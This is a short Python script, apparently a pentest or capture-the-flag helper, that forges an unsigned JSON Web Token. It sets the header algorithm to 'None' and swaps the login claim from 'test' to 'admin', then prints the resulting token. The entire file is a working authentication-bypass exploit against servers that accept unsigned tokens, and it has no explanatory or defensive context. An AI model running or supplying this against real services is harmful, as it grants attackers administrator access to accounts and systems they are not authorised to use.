#!usr/bin/python3
####################
# @saravana_seeker #
####################

import base64 
import json


#change the header and payload value

h={"alg":"None","typ":"JWS"}
#{"login":"test","iat":"1597315413"}
p={"login":"admin","iat":"1597315413"}

t=base64.urlsafe_b64encode(bytes(json.dumps(h),encoding='utf8')).decode('utf8').rstrip("=")+"."+base64.urlsafe_b64encode(bytes(json.dumps(p),encoding='utf8')).decode('utf8').rstrip("=")+"."

print(t)
